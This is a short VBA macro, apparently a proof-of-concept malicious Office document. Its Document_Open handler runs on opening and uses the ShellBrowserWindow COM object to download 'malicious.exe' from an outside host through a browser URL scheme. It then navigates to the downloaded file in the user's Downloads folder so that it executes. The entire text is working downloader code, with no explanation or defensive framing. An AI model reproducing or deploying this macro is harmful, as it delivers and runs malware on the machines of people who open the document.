Private Sub Document_Open()
    downloadpath = Environ("USERPROFILE")
    Set objectinstance = CreateObject("ShellBrowserWindow")
    Set objectinstance = CreateObject("new:{C08AFD90-F2A1-11D1-8455-00A0C91F3880}")

    objectinstance.navigate "microsoft-egde://mr.un1k0d3r.com/malicious.exe", 0
    objectinstance.navigate downloadpath & "\\Downloads\\malicious.exe"

End Sub
